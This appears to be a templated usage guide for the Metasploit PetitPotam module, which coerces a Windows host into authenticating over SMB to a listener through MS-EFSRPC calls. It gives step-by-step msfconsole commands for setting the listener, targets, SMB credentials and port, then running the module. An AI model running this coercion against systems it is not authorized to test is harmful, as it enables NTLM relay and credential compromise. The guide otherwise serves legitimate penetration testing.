**The description of current metasploit exploit**
Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/dcerpc/petitpotam
```

Then set the required options:

```bash
# Required parameters with no default value
set LISTENER <your Listener IP here>
set RHOSTS <your Target Host(s) here>
set SMBPass <your Password here>
set SMBUser <your Username here>
# Repeat for each required parameter from Step 1
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 445 - The SMB service port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```

---
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.